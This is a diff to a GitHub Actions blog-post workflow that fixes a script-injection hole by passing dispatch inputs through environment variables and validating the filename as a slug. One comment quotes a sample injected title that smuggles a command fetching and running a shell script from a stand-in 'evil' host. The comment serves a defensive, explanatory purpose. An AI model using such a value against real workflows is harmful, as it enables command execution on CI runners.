@@ -33,6 +33,18 @@ jobs:
     runs-on: ubuntu-latest
     permissions:
       contents: write
+    # All dispatch inputs reach the shell as env vars (job-level env below),
+    # never as `${{ inputs.* }}` inside a script. `${{ }}` is pasted into the
+    # script text before bash parses it, so a title like `x"; curl evil | sh; "`
+    # used to run as a command in the commit step. Dispatch needs write
+    # access, so this is hardening rather than a privilege boundary.
+    # (Audit 2026-11-26; this repo is the retired v1 site.)
+    env:
+      TITLE: ${{ inputs.title }}
+      FILENAME: ${{ inputs.filename }}
+      DESCRIPTION: ${{ inputs.description }}
+      TAGS: ${{ inputs.tags }}
+      PUBLISH_NOW: ${{ inputs.publish_now }}
 
     steps:
       - name: Checkout
@@ -41,12 +53,15 @@ jobs:
           ref: master
 
       - name: Create Blog Post
-        env:
-          TITLE: ${{ inputs.title }}
-          DESCRIPTION: ${{ inputs.description }}
-          TAGS: ${{ inputs.tags }}
         run: |
-          POST_FILE="src/content/blog/${{ inputs.filename }}.md"
+          # The filename becomes a path, so allow only a lowercase slug. This
+          # blocks `../` (writing outside src/content/blog/) and anything
+          # that is not a plain file name.
+          if ! [[ "$FILENAME" =~ ^[a-z0-9][a-z0-9-]*$ ]]; then
+            echo "::error::filename must be lowercase letters, digits and hyphens."
+            exit 1
+          fi
+          POST_FILE="src/content/blog/${FILENAME}.md"
 
           if [ -f "$POST_FILE" ]; then
             echo "Error: Post file $POST_FILE already exists!"
@@ -55,7 +70,7 @@ jobs:
 
           # Create frontmatter
           TODAY=$(date +%Y-%m-%d)
-          if [ "${{ inputs.publish_now }}" == "true" ]; then
+          if [ "$PUBLISH_NOW" == "true" ]; then
             DRAFT_LINE=""
           else
             DRAFT_LINE="draft: true"
@@ -105,12 +120,12 @@ jobs:
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add src/content/blog/${{ inputs.filename }}.md
+          git add "src/content/blog/${FILENAME}.md"
 
-          if [ "${{ inputs.publish_now }}" == "true" ]; then
-            git commit -m "Add new blog post: ${{ inputs.title }}"
+          if [ "$PUBLISH_NOW" == "true" ]; then
+            git commit -m "Add new blog post: ${TITLE}"
           else
-            git commit -m "Add new draft blog post: ${{ inputs.title }}"
+            git commit -m "Add new draft blog post: ${TITLE}"
           fi
 
           git push
@@ -119,12 +134,12 @@ jobs:
         run: |
           echo "✅ Blog post created successfully!" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**Title:** ${{ inputs.title }}" >> $GITHUB_STEP_SUMMARY
-          echo "**Filename:** ${{ inputs.filename }}.md" >> $GITHUB_STEP_SUMMARY
-          echo "**Status:** $( [ '${{ inputs.publish_now }}' == 'true' ] && echo 'Published' || echo 'Draft' )" >> $GITHUB_STEP_SUMMARY
-          echo "**Tags:** ${{ inputs.tags }}" >> $GITHUB_STEP_SUMMARY
+          echo "**Title:** ${TITLE}" >> $GITHUB_STEP_SUMMARY
+          echo "**Filename:** ${FILENAME}.md" >> $GITHUB_STEP_SUMMARY
+          echo "**Status:** $( [ "$PUBLISH_NOW" == 'true' ] && echo 'Published' || echo 'Draft' )" >> $GITHUB_STEP_SUMMARY
+          echo "**Tags:** ${TAGS}" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
-          if [ "${{ inputs.publish_now }}" == "true" ]; then
+          if [ "$PUBLISH_NOW" == "true" ]; then
             echo "🚀 The post will be deployed to your site shortly." >> $GITHUB_STEP_SUMMARY
           else
             echo "📝 The post is saved as a draft. Use the 'Publish Blog Post' workflow to publish it later." >> $GITHUB_STEP_SUMMARY
